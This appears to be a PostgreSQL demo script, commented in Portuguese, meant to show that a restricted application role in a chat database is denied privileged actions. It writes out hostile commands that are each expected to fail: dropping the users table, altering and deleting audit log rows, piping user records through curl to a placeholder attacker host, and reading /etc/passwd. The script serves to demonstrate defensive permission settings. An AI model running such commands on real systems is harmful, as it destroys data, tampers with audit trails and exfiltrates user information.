-- Demonstracao para a apresentacao, o que o app_api NAO consegue fazer.
-- Cada comando abaixo deve falhar com "permission denied" (ou "must be ...").
--
--   docker compose exec -e PGPASSWORD="$APP_API_PASSWORD" db \
--       psql -U app_api -d e2ee_chat -f /demo_app_api.sql

\echo '--- DDL: DROP TABLE users'
DROP TABLE users;

\echo '--- audit_log e append-only: UPDATE'
UPDATE audit_log SET action = 'adulterado';

\echo '--- audit_log e append-only: DELETE'
DELETE FROM audit_log;

\echo '--- exfiltracao via COPY ... TO PROGRAM (exige superuser)'
COPY (SELECT * FROM users) TO PROGRAM 'curl -d @- http://atacante.example';

\echo '--- ler arquivo do servidor (exige superuser)'
COPY users FROM '/etc/passwd';
